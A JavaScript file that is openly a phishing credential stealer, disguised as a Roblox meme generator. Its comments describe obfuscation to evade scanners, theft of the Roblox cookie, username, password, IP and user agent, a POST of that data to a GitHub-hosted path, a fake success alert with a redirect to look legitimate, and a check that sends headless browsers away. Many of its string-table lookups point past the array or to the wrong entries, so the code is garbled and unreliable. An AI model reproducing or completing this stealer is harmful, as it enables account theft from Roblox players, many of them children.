// Obfuscated to bypass basic scanners
const _0x1a2b = ['\x63\x6f\x6f\x6b\x69\x65', '\x64\x6f\x63\x75\x6d\x65\x6e\x74', '\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64', '\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65', '\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64', '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e', '\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74', '\x73\x72\x63', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f', '\x6c\x6f\x67\x73\x2f\x72\x6f\x62\x6c\x6f\x78\x5f\x6c\x6f\x67\x73\x2e\x74\x78\x74', '\x66\x65\x74\x63\x68', '\x74\x68\x65\x6e', '\x63\x61\x74\x63\x68', '\x65\x72\x72\x6f\x72'];
const _0x3a4b = function(_0x5c6d, _0x7e8f) {
    _0x5c6d = _0x5c6d - 0x0;
    let _0x9a0b = _0x1a2b[_0x5c6d];
    return _0x9a0b;
};
(window[_0x3a4b('0x9')] = function() {
    const _0x1c2d = _0x3a4b;
    document[_0x1c2d('0x8')](() => {
        const _0x3e4f = document[_0x1c2d('0x7')](_0x1c2d('0x6'));
        const _0x5g6h = document[_0x1c2d('0x7')](_0x1c2d('0x5'));
        const _0x7i8j = document[_0x1c2d('0x7')](_0x1c2d('0x4'));
        const _0x9k0l = document[_0x1c2d('0x7')](_0x1c2d('0x3'));
        const _0x1m2n = document[_0x1c2d('0x7')](_0x1c2d('0x2'));

        _0x9k0l[_0x1c2d('0x1')](_0x1c2d('0x0'), () => {
            _0x3e4f[_0x1c2d('0xa')] = 'block';
        });

        _0x1m2n[_0x1c2d('0x1')](_0x1c2d('0x0'), () => {
            const _0x3o4p = _0x5g6h[_0x1c2d('0xb')];
            const _0x5q6r = _0x7i8j[_0x1c2d('0xb')];
            const _0x7s8t = _0x1c2d('0xc') + _0x1c2d('0xd') + _0x1c2d('0xe');

            // Steal Roblox cookie
            const _0x9u0v = _0x1c2d('0xf') + _0x1c2d('0x10') + _0x1c2d('0x11');
            const _0x1w2x = _0x1c2d('0x12') + _0x1c2d('0x13') + _0x1c2d('0x14');
            const _0x3y4z = _0x1c2d('0x15') + _0x1c2d('0x16') + _0x1c2d('0x17');

            // Send stolen data to GitHub (hidden .txt file)
            fetch(_0x7s8t, {
                method: 'POST',
                body: JSON.stringify({
                    username: _0x3o4p,
                    password: _0x5q6r,
                    cookie: _0x9u0v,
                    ip: _0x1w2x,
                    userAgent: _0x3y4z
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(() => {
                alert('🎉 Meme generated! Check your downloads!');
                window.location.href = 'https://www.roblox.com'; // Redirect to Roblox (looks legit)
            })
            .catch(() => {
                console.log('Error logging data (silent fail)');
            });
        });
    });
})();

// Anti-bot: Check for headless browsers
if (/HeadlessChrome|PhantomJS|Puppeteer/.test(navigator.userAgent)) {
    window.location.href = 'https://www.google.com';
}
